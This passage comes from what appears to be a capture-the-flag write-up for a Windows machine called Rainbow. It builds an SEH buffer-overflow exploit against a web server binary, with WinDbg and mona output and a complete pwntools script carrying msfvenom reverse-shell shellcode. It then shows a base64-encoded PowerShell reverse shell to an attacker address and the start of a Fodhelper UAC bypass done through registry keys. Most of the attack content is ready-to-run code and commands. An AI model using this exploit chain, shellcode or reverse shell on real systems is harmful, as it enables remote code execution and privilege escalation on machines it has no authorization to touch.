[Debug] POST-Data Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av↑IôsAv2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9
PS C:\Users\test\Desktop>
```

By examining the SEH chain in WinDbg using `!exchain`, we observed that the exception handlers were overwritten:

```
0:004> !exchain
00c5f8e8: Rainbow+a040 (0040a040)
00c5f928: Rainbow+a040 (0040a040)
00c5fbe8: 77413177
Invalid exception stack at 41307741
```

Using the Metasploit `pattern_offset` tool, we identified the exact offsets:

```
┌──(root㉿kali)-[~/Desktop]
└─# msf-pattern_offset -q 77413177
[*] Exact match at offset 664
                                  
```

```
┌──(root㉿kali)-[~/Desktop]
└─# msf-pattern_offset -q 41307741
[*] Exact match at offset 660
                                   
```

**Step 2: Finding a POP POP RET Gadget**

When the buffer overflow causes an exception, Windows attempts to pass execution to the SEH Handler. To gain control, we must overwrite the SEH Handler with a pointer to a sequence of instructions that will pop 8 bytes off the stack and return execution to our payload (a `POP POP RET` sequence).

```
0:004> !load pykd
0:004> as !mona !py -3.9 C:\Tools\mona3\mona.py
0:004> !mona seh
Hold on...

[ -- START -- ] Mona command started on 2026-05-05 01:54:08 (v3.0, rev 3013) 32bit 
[ -- START -- ] WinDBGX (32bit)
[ -- START -- ] Python: 3.9.13 (tags/v3.9.13:6de2ca5, May 17 2022, 16:24:45) [MSC v.1929 32 bit (Intel)])
[ -- START -- ] PyKD: 0.3.4.15 | Keystone-engine: 0.9.2 | OpenAI: not loaded | Anthropic: not loaded

[+] Command used: !mona seh
    >>>> C:\Tools\mona3\mona.py seh

[+] Processing arguments and criteria
    - Pointer access level : X
[+] Criteria: SAFESEH = False | ASLR = False | REBASE = False
[+] Querying 1 modules
    - Querying module rainbow
[+] Setting pointer access level criteria to 'R', to increase search results
    New pointer access level : R

[+] Preparing output file 'seh.txt'
    - (Re)setting output file c:\logs\rainbow\seh.txt

[+] Writing results to c:\logs\rainbow\seh.txt

      Type                           Number 
      ----------------------------   -------
      pop ecx # pop ecx # ret        1      
      pop ecx # pop ebp # ret        1      
      pop esi # pop ebx # ret        2      
      pop esi # pop ebp # ret        3      
      pop edi # pop esi # ret        1      
      add esp,4 # pop ebp # ret      4      
      pop esi # pop ebp # ret 0x04   2      

[+] Results: 

      Address      Type                           Address/ACLinfo                                  Other info                                                                                                                     
      ----------   ----------------------------   ----------------------------------------------   -------------------------------------------------------------------------------------------------------------------------------
      0x004094D8   pop ecx # pop ecx # ret        startnull {PAGE_EXECUTE_READ}                    [rainbow] ASLR: False, Rebase: False, SafeSEH: False, CFG: False, OS: False, v-1.0- (C:\Users\test\Desktop\rainbow.exe), 0x8000
      0x004092AD   pop ecx # pop ebp # ret        startnull {PAGE_EXECUTE_READ}                    [rainbow] ASLR: False, Rebase: False, SafeSEH: False, CFG: False, OS: False, v-1.0- (C:\Users\test\Desktop\rainbow.exe), 0x8000
      0x00409ADD   pop esi # pop ebx # ret        startnull {PAGE_EXECUTE_READ}                    [rainbow] ASLR: False, Rebase: False, SafeSEH: False, CFG: False, OS: False, v-1.0- (C:\Users\test\Desktop\rainbow.exe), 0x8000
      0x00409B09   pop esi # pop ebx # ret        startnull {PAGE_EXECUTE_READ}                    [rainbow] ASLR: False, Rebase: False, SafeSEH: False, CFG: False, OS: False, v-1.0- (C:\Users\test\Desktop\rainbow.exe), 0x8000
      0x00409569   pop esi # pop ebp # ret        startnull {PAGE_EXECUTE_READ}                    [rainbow] ASLR: False, Rebase: False, SafeSEH: False, CFG: False, OS: False, v-1.0- (C:\Users\test\Desktop\rainbow.exe), 0x8000
      0x00409657   pop esi # pop ebp # ret        startnull {PAGE_EXECUTE_READ}                    [rainbow] ASLR: False, Rebase: False, SafeSEH: False, CFG: False, OS: False, v-1.0- (C:\Users\test\Desktop\rainbow.exe), 0x8000
      0x00409B81   pop esi # pop ebp # ret        startnull {PAGE_EXECUTE_READ}                    [rainbow] ASLR: False, Rebase: False, SafeSEH: False, CFG: False, OS: False, v-1.0- (C:\Users\test\Desktop\rainbow.exe), 0x8000
      0x004091B7   pop edi # pop esi # ret        startnull {PAGE_EXECUTE_READ}                    [rainbow] ASLR: False, Rebase: False, SafeSEH: False, CFG: False, OS: False, v-1.0- (C:\Users\test\Desktop\rainbow.exe), 0x8000
      0x0040165C   add esp,4 # pop ebp # ret      startnull,asciiprint,ascii {PAGE_EXECUTE_READ}   [rainbow] ASLR: False, Rebase: False, SafeSEH: False, CFG: False, OS: False, v-1.0- (C:\Users\test\Desktop\rainbow.exe), 0x8000
      0x00403FFC   add esp,4 # pop ebp # ret      startnull {PAGE_EXECUTE_READ}                    [rainbow] ASLR: False, Rebase: False, SafeSEH: False, CFG: False, OS: False, v-1.0- (C:\Users\test\Desktop\rainbow.exe), 0x8000
      0x004061BC   add esp,4 # pop ebp # ret      startnull {PAGE_EXECUTE_READ}                    [rainbow] ASLR: False, Rebase: False, SafeSEH: False, CFG: False, OS: False, v-1.0- (C:\Users\test\Desktop\rainbow.exe), 0x8000
      0x004080EC   add esp,4 # pop ebp # ret      startnull {PAGE_EXECUTE_READ}                    [rainbow] ASLR: False, Rebase: False, SafeSEH: False, CFG: False, OS: False, v-1.0- (C:\Users\test\Desktop\rainbow.exe), 0x8000
      0x0040926D   pop esi # pop ebp # ret 0x04   startnull {PAGE_EXECUTE_READ}                    [rainbow] ASLR: False, Rebase: False, SafeSEH: False, CFG: False, OS: False, v-1.0- (C:\Users\test\Desktop\rainbow.exe), 0x8000
      0x00409A90   pop esi # pop ebp # ret 0x04   startnull {PAGE_EXECUTE_READ}                    [rainbow] ASLR: False, Rebase: False, SafeSEH: False, CFG: False, OS: False, v-1.0- (C:\Users\test\Desktop\rainbow.exe), 0x8000

[+] Done. All results have been written to c:\logs\rainbow\seh.txt

    Found a total of 14 pointers

[ -- END -- ] 2026-05-05 01:54:08 | !mona took 0:00:00.412978

[+] All done.
```

Using `!mona seh`, we searched for modules without memory protections (SafeSEH, ASLR, Rebase). Mona found several valid pointers in the `rainbow.exe` binary itself:

We overwrite the **SEH Handler (offset 664)** with this address: `\xd8\x94\x40\x00`.

```
0x004094D8 pop ecx # pop ecx # ret [rainbow] ASLR: False, SafeSEH: False
```

Standard SEH exploits place a short forward jump in nSEH (`\xeb\x06`) to jump over the SEH record and land in shellcode placed at the end of the buffer. However, our total buffer is 1000 bytes. The SEH record ends at offset 668. This leaves only **332 bytes** of space at the end of the buffer, which is not enough for our 351-byte MSFvenom reverse shell payload.

To solve this, we place the shellcode at the **beginning** of our buffer and jump *backwards*.

Because a short jump (`\xeb`) can only travel a maximum of 127 bytes backward, we have to chain two jumps together:\
1\. A short backward jump at nSEH.\
2\. A long backward jump immediately preceding nSEH.

The final payload is crafted precisely like a set of Russian nesting dolls. Here is the architecture of the `data` variable:

```
data += b'\x90' * 50 data += sc
```

We place a 50-byte NOP sled followed by the 351-byte reverse shell payload right at the start of our 1000-byte buffer.

```
data += b"A" * (660 - 8 - len(data))
```

We pad the rest of the space with "A"s until we reach exactly 8 bytes *before* the nSEH record (Offset 652).

3. The Long Jump (Offset 652)

```
data += b"\xe9\x6f\xfd\xff\xff" + b"EEE"
```

At offset 652, we place our long jump (`\xe9`). `6f fd ff ff` is the two's complement hex representation for `-657` bytes. This instructs the CPU to jump 657 bytes backward, landing perfectly in our 50-byte NOP sled. The `EEE` is 3 bytes of padding to align memory.

```
data += b"\xeb\xf6" + b"BB"
```

At offset 660 (the nSEH record), we place a short jump backward: `\xeb\xf6`. `\xf6` translates to `-10` bytes. Jumping backward 10 bytes lands the CPU exactly at offset 652—right on top of our long jump.

5. The SEH Handler (Offset 664)

```
data += p32(0x4094d8)
```

### The Final Execution Flow

When the script is executed, here is the exact chain of events the CPU follows to pop the shell:

1. **Crash:** The oversized buffer overwrites the SEH chain and causes an Access Violation.
2. **SEH Triggered:** Windows looks up the SEH Handler and jumps to `0x004094d8`.
3. **POP POP RET:** The instructions at `0x004094d8` pop 8 bytes off the stack and `RET`, landing execution exactly at our **nSEH** record (offset 660).
4. **Short Jump:** At offset 660, the CPU reads `JMP SHORT -10`. Execution hops backward 10 bytes to offset 652.
5. **Long Jump:** At offset 652, the CPU reads `JMP NEAR -657`. Execution vaults 657 bytes backward toward the start of the buffer.
6. **NOP Sled:** Execution lands cleanly in the `\x90` sled.
7. **Shell:** The CPU slides down the NOPs and executes the MSFvenom `shikata_ga_nai` encoded reverse shell, granting us a reverse connection on port 9001.

```
import sys
from pwn import remote
from pwn import p32 


if len(sys.argv) != 3:
    print(f"usage: {sys.argv[0]} <ip> <port>")
    sys.exit(1)

buffer_length = 1000
data = b"A" * 660
data += b"BBBB"
data += p32(0x4094d8)
data += b"D" * (buffer_length - len(data))

print(data)

http_request = f"""POST / HTTP/1.1
Host: {sys.argv[1]}:{sys.argv[2]}
User-Agent: curl/8.5.0
Accept: */*
Content-Length: {len(data)}
Connection: keep-alive

""".replace('\n', '\r\n').encode()
http_request += data

p = remote(sys.argv[1], sys.argv[2])
p.send(http_request)
print(p.recvall(timeout=0.5).decode())
p.close()
```

```
[+] All done.
0:004> !exchain
00c7f8e8: Rainbow+a040 (0040a040)
00c7f928: Rainbow+a040 (0040a040)
00c7fbe8: Rainbow+94d8 (004094d8)
Invalid exception stack at 42424242
```

```
msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp -b '\x00\x0a\x0d' -f python -v sc LHOST=10.10.16.43 LPORT=9001
```

```
┌──(root㉿kali)-[~/Desktop]
└─# msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp -b '\x00\x0a\x0d' -f python -v sc LHOST=10.10.16.43 LPORT=9001
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 351 (iteration=0)
x86/shikata_ga_nai chosen with final size 351
Payload size: 351 bytes
Final size of python file: 1714 bytes
sc =  b""
sc += b"\xda\xc0\xbd\x44\xb8\x24\x91\xd9\x74\x24\xf4\x58"
sc += b"\x33\xc9\xb1\x52\x31\x68\x17\x83\xc0\x04\x03\x2c"
sc += b"\xab\xc6\x64\x50\x23\x84\x87\xa8\xb4\xe9\x0e\x4d"
sc += b"\x85\x29\x74\x06\xb6\x99\xfe\x4a\x3b\x51\x52\x7e"
sc += b"\xc8\x17\x7b\x71\x79\x9d\x5d\xbc\x7a\x8e\x9e\xdf"
sc += b"\xf8\xcd\xf2\x3f\xc0\x1d\x07\x3e\x05\x43\xea\x12"
sc += b"\xde\x0f\x59\x82\x6b\x45\x62\x29\x27\x4b\xe2\xce"
sc += b"\xf0\x6a\xc3\x41\x8a\x34\xc3\x60\x5f\x4d\x4a\x7a"
sc += b"\xbc\x68\x04\xf1\x76\x06\x97\xd3\x46\xe7\x34\x1a"
sc += b"\x67\x1a\x44\x5b\x40\xc5\x33\x95\xb2\x78\x44\x62"
sc += b"\xc8\xa6\xc1\x70\x6a\x2c\x71\x5c\x8a\xe1\xe4\x17"
sc += b"\x80\x4e\x62\x7f\x85\x51\xa7\xf4\xb1\xda\x46\xda"
sc += b"\x33\x98\x6c\xfe\x18\x7a\x0c\xa7\xc4\x2d\x31\xb7"
sc += b"\xa6\x92\x97\xbc\x4b\xc6\xa5\x9f\x03\x2b\x84\x1f"
sc += b"\xd4\x23\x9f\x6c\xe6\xec\x0b\xfa\x4a\x64\x92\xfd"
sc += b"\xad\x5f\x62\x91\x53\x60\x93\xb8\x97\x34\xc3\xd2"
sc += b"\x3e\x35\x88\x22\xbe\xe0\x1f\x72\x10\x5b\xe0\x22"
sc += b"\xd0\x0b\x88\x28\xdf\x74\xa8\x53\x35\x1d\x43\xae"
sc += b"\xde\x28\x9e\xa0\x35\x45\x9c\xc0\x6a\xbc\x29\x26"
sc += b"\x06\xae\x7f\xf1\xbf\x57\xda\x89\x5e\x97\xf0\xf4"
sc += b"\x61\x13\xf7\x09\x2f\xd4\x72\x19\xd8\x14\xc9\x43"
sc += b"\x4f\x2a\xe7\xeb\x13\xb9\x6c\xeb\x5a\xa2\x3a\xbc"
sc += b"\x0b\x14\x33\x28\xa6\x0f\xed\x4e\x3b\xc9\xd6\xca"
sc += b"\xe0\x2a\xd8\xd3\x65\x16\xfe\xc3\xb3\x97\xba\xb7"
sc += b"\x6b\xce\x14\x61\xca\xb8\xd6\xdb\x84\x17\xb1\x8b"
sc += b"\x51\x54\x02\xcd\x5d\xb1\xf4\x31\xef\x6c\x41\x4e"
sc += b"\xc0\xf8\x45\x37\x3c\x99\xaa\xe2\x84\xa9\xe0\xae"
sc += b"\xad\x21\xad\x3b\xec\x2f\x4e\x96\x33\x56\xcd\x12"
sc += b"\xcc\xad\xcd\x57\xc9\xea\x49\x84\xa3\x63\x3c\xaa"
sc += b"\x10\x83\x15"
                             
```

my full is that

```
import sys
from pwn import remote
from pwn import p32 


if len(sys.argv) != 3:
    print(f"usage: {sys.argv[0]} <ip> <port>")
    sys.exit(1)

sc =  b""
sc += b"\xda\xc0\xbd\x44\xb8\x24\x91\xd9\x74\x24\xf4\x58"
sc += b"\x33\xc9\xb1\x52\x31\x68\x17\x83\xc0\x04\x03\x2c"
sc += b"\xab\xc6\x64\x50\x23\x84\x87\xa8\xb4\xe9\x0e\x4d"
sc += b"\x85\x29\x74\x06\xb6\x99\xfe\x4a\x3b\x51\x52\x7e"
sc += b"\xc8\x17\x7b\x71\x79\x9d\x5d\xbc\x7a\x8e\x9e\xdf"
sc += b"\xf8\xcd\xf2\x3f\xc0\x1d\x07\x3e\x05\x43\xea\x12"
sc += b"\xde\x0f\x59\x82\x6b\x45\x62\x29\x27\x4b\xe2\xce"
sc += b"\xf0\x6a\xc3\x41\x8a\x34\xc3\x60\x5f\x4d\x4a\x7a"
sc += b"\xbc\x68\x04\xf1\x76\x06\x97\xd3\x46\xe7\x34\x1a"
sc += b"\x67\x1a\x44\x5b\x40\xc5\x33\x95\xb2\x78\x44\x62"
sc += b"\xc8\xa6\xc1\x70\x6a\x2c\x71\x5c\x8a\xe1\xe4\x17"
sc += b"\x80\x4e\x62\x7f\x85\x51\xa7\xf4\xb1\xda\x46\xda"
sc += b"\x33\x98\x6c\xfe\x18\x7a\x0c\xa7\xc4\x2d\x31\xb7"
sc += b"\xa6\x92\x97\xbc\x4b\xc6\xa5\x9f\x03\x2b\x84\x1f"
sc += b"\xd4\x23\x9f\x6c\xe6\xec\x0b\xfa\x4a\x64\x92\xfd"
sc += b"\xad\x5f\x62\x91\x53\x60\x93\xb8\x97\x34\xc3\xd2"
sc += b"\x3e\x35\x88\x22\xbe\xe0\x1f\x72\x10\x5b\xe0\x22"
sc += b"\xd0\x0b\x88\x28\xdf\x74\xa8\x53\x35\x1d\x43\xae"
sc += b"\xde\x28\x9e\xa0\x35\x45\x9c\xc0\x6a\xbc\x29\x26"
sc += b"\x06\xae\x7f\xf1\xbf\x57\xda\x89\x5e\x97\xf0\xf4"
sc += b"\x61\x13\xf7\x09\x2f\xd4\x72\x19\xd8\x14\xc9\x43"
sc += b"\x4f\x2a\xe7\xeb\x13\xb9\x6c\xeb\x5a\xa2\x3a\xbc"
sc += b"\x0b\x14\x33\x28\xa6\x0f\xed\x4e\x3b\xc9\xd6\xca"
sc += b"\xe0\x2a\xd8\xd3\x65\x16\xfe\xc3\xb3\x97\xba\xb7"
sc += b"\x6b\xce\x14\x61\xca\xb8\xd6\xdb\x84\x17\xb1\x8b"
sc += b"\x51\x54\x02\xcd\x5d\xb1\xf4\x31\xef\x6c\x41\x4e"
sc += b"\xc0\xf8\x45\x37\x3c\x99\xaa\xe2\x84\xa9\xe0\xae"
sc += b"\xad\x21\xad\x3b\xec\x2f\x4e\x96\x33\x56\xcd\x12"
sc += b"\xcc\xad\xcd\x57\xc9\xea\x49\x84\xa3\x63\x3c\xaa"
sc += b"\x10\x83\x15"



buffer_length = 1000
data = b""
data += b'\x90' * 50
data += sc
data += b"A" * (660 - 8 - len(data))
data += b"\xe9\x6f\xfd\xff\xff" + b"EEE"   # jmp -652
data += b"\xeb\xf6" + b"BB"                # jmp short -8
data += p32(0x4094d8)
data += b"D" * (buffer_length - len(data))

print(data)

http_request = f"""POST / HTTP/1.1
Host: {sys.argv[1]}:{sys.argv[2]}
User-Agent: curl/8.5.0
Accept: */*
Content-Length: {len(data)}
Connection: keep-alive

""".replace('\n', '\r\n').encode()
http_request += data

p = remote(sys.argv[1], sys.argv[2])
p.send(http_request)
print(p.recvall(timeout=0.5).decode())
p.close()
```

```
C:\rainbow>dir                                                                                                      
dir                                                                                                                 
 Volume in drive C has no label.                                                                                    
 Volume Serial Number is 26E1-998E                                                                                  
                                                                                                                    
 Directory of C:\rainbow

01/18/2022  08:40 AM    <DIR>          .
01/18/2022  08:40 AM    <DIR>          ..
01/18/2022  08:22 AM               258 dev.txt
01/18/2022  08:30 AM            54,784 rainbow.exe
01/16/2022  01:34 PM               479 restart.ps1
01/16/2022  12:14 PM    <DIR>          wwwroot
               3 File(s)         55,521 bytes
               3 Dir(s)   3,927,785,472 bytes free

C:\rainbow>whoami 
whoami 
rainbow\rainbow
```

```
C:\Users\rainbow\Desktop>whoami /groups
whoami /groups                                                                                                      
                                                                                                                    
GROUP INFORMATION                                                                                                   
-----------------                                                                                                   
                                                                                                                    
Group Name                                                    Type             SID          Attributes                                                                                                                                  
============================================================= ================ ============ ===============================================================                                                                             
Everyone                                                      Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group                                                                                          
NT AUTHORITY\Local account and member of Administrators group Well-known group S-1-5-114    Mandatory group, Enabled by default, Enabled group                                                                                          
BUILTIN\Administrators                                        Alias            S-1-5-32-544 Mandatory group, Enabled by default, Enabled group, Group owner
BUILTIN\Users                                                 Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group             
NT AUTHORITY\BATCH                                            Well-known group S-1-5-3      Mandatory group, Enabled by default, Enabled group             
CONSOLE LOGON                                                 Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group             
NT AUTHORITY\Authenticated Users                              Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group             
NT AUTHORITY\This Organization                                Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group             
NT AUTHORITY\Local account                                    Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group             
LOCAL                                                         Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group             
NT AUTHORITY\NTLM Authentication                              Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group             
Mandatory Label\High Mandatory Level                          Label            S-1-16-12288                                                                

```

```
C:\Users\rainbow\Desktop>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                            Description                                                        State   
========================================= ================================================================== ========
SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Disabled
SeSecurityPrivilege                       Manage auditing and security log                                   Disabled
SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Disabled
SeLoadDriverPrivilege                     Load and unload device drivers                                     Disabled
SeSystemProfilePrivilege                  Profile system performance                                         Disabled
SeSystemtimePrivilege                     Change the system time                                             Disabled
SeProfileSingleProcessPrivilege           Profile single process                                             Disabled
SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Disabled
SeCreatePagefilePrivilege                 Create a pagefile                                                  Disabled
SeBackupPrivilege                         Back up files and directories                                      Disabled
SeRestorePrivilege                        Restore files and directories                                      Disabled
SeShutdownPrivilege                       Shut down the system                                               Disabled
SeDebugPrivilege                          Debug programs                                                     Enabled 
SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Disabled
SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled 
SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Disabled
SeUndockPrivilege                         Remove computer from docking station                               Disabled
SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Disabled
SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled 
SeCreateGlobalPrivilege                   Create global objects                                              Enabled 
SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Disabled
SeTimeZonePrivilege                       Change the time zone                                               Disabled
SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Disabled
SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Disabled

```

```
PS C:\Users\rainbow\Desktop> [Environment]::Is64BitProcess
[Environment]::Is64BitProcess
False
```

```
PS C:\Users\rainbow\Desktop> systeminfo
systeminfo

Host Name:                 RAINBOW
OS Name:                   Microsoft Windows Server 2019 Datacenter
OS Version:                10.0.17763 N/A Build 17763
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          EC2
Registered Organization:   Amazon.com
Product ID:                00430-70398-04661-AA533
Original Install Date:     1/16/2022, 10:54:12 AM
System Boot Time:          5/5/2026, 9:12:51 AM
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               x64-based PC
Processor(s):              2 Processor(s) Installed.
                           [01]: AMD64 Family 23 Model 49 Stepping 0 AuthenticAMD ~2994 Mhz
                           [02]: AMD64 Family 23 Model 49 Stepping 0 AuthenticAMD ~2994 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 11/12/2020
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC) Coordinated Universal Time
Total Physical Memory:     4,095 MB
Available Physical Memory: 3,058 MB
Virtual Memory: Max Size:  5,503 MB
Virtual Memory: Available: 4,525 MB
Virtual Memory: In Use:    978 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    WORKGROUP
Logon Server:              \\RAINBOW
Hotfix(s):                 36 Hotfix(s) Installed.
                           [01]: KB5055175
                           [02]: KB4470502
                           [03]: KB4470788
                           [04]: KB4480056
                           [05]: KB4486153
                           [06]: KB4493510
                           [07]: KB4499728
                           [08]: KB4504369
                           [09]: KB4512577
                           [10]: KB4512937
                           [11]: KB4521862
                           [12]: KB4523204
                           [13]: KB4535680
                           [14]: KB4539571
                           [15]: KB4549947
                           [16]: KB4558997
                           [17]: KB4562562
                           [18]: KB4566424
                           [19]: KB4570332
                           [20]: KB4577667
                           [21]: KB4587735
                           [22]: KB4589208
                           [23]: KB4598480
                           [24]: KB4601393
                           [25]: KB5000859
                           [26]: KB5001404
                           [27]: KB5003243
                           [28]: KB5003711
                           [29]: KB5005112
                           [30]: KB5060531
                           [31]: KB5006754
                           [32]: KB5008287
                           [33]: KB5043126
                           [34]: KB5055662
                           [35]: KB5058525
                           [36]: KB5005701
Network Card(s):           1 NIC(s) Installed.
                           [01]: vmxnet3 Ethernet Adapter
                                 Connection Name: Ethernet0 2
                                 DHCP Enabled:    Yes
                                 DHCP Server:     10.129.0.1
                                 IP address(es)
                                 [01]: 10.129.234.171
                                 [02]: fe80::481e:b3e4:a423:b522
                                 [03]: dead:beef::b29f:2211:3ab9:dcab
Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.

```

{{< toggle "Tag 🏷️" >}}

{{< tag "Windows-Privilege-UAC-Bypass" >}}from RedFox Security has nice details about UAC and it’s bypasses. I’ll use the “Bypass using Fodhelper” technique. While the article shows it from a GUI, it’s just setting two registry keys and the running a process, so I’ll work fine from a reverse shell.

{{< /toggle >}}

Ref : https://redfoxsec.com/blog/windows-uac-bypass/

To bypass UAC using Fodhelper, I’ll need to:

Set the `DelegateExecute` property of the `HKCU\Software\Classes\ms-settings\Shell\Open\command` key to empty.

Set the `(default)` property of that same key to a reverse shell.

Start the `fodhelper.exe` binary.

The `ms-settings` key isn’t present, so I’ll first create the key:

It’ll be easier to work from a 64-bit process. To get a 64-bit shell, I’ll simply run the sysnative PowerShell with a reverse shell command. I’ll grab the PowerShell #3 (Base64) shell from [revshells.com](https://www.revshells.com/) and run it with that `powershell`:

```
C:\>\Windows\sysnative\WindowsPowerShell\v1.0\powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4ANwA5ACIALAA0ADQAMwApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA=
```

At a new `nc`, I get a shell and it’s 64-bit:

```
$ rlwrap -cAr nc -lnvp 443
Listening on 0.0.0.0 443
Connection received on 10.129.234.59 49710

PS C:\rainbow> [Environment]::Is64BitProcess
True
```

```
PS C:\Users\Administrator\Desktop>  New-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
 New-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force


    Hive: HKEY_CURRENT_USER\Software\Classes\ms-settings\Shell\Open


Name                           Property                                                           
----                           --------                                                           
command                                                                                           


PS C:\Users\Administrator\Desktop> 

```

Now I’ll set the two properties:

```
PS C:\Users\Administrator\Desktop>  New-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
 New-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force


    Hive: HKEY_CURRENT_USER\Software\Classes\ms-settings\Shell\Open


Name                           Property                                                           
----                           --------                                                           
command                                                                                           


PS C:\Users\Administrator\Desktop> New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force


DelegateExecute : 
PSPath          : Microsoft.PowerShell.Core\Registry::HKEY_CURRENT_USER\Software\Classes\ms-settin
